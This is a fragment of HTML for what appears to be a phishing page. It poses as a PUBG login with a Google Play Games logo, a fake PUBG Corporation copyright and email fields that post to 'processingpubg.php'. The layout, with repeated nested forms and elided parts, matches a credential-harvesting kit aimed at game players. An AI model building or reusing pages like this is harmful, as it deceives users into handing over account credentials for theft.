...
<div class="col-md-8">
       <form action="processingpubg.php" id="login-form" method="post">
  <h4 >
<img src="https://upload.wikimedia.org/wikipedia/id/5/59/Google_Play_Games.png" height="50px" width="50px">  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="google1" placeholder="Email" type="text" >
</div>
<div style="width:100%" class="form-group">
 ...
 <form action="processingpubg.php" id="login-form" method="post">
<h4 >
<img src="http://assets.stickpng.com/thumbs/580b57fcd9996e24bc43c53e.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
...
<div style="width:100%" class="form-group">
 ...
 <p><center><b>COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED</b>.</p>
</center>
</div><br>
</div>
  </p> 
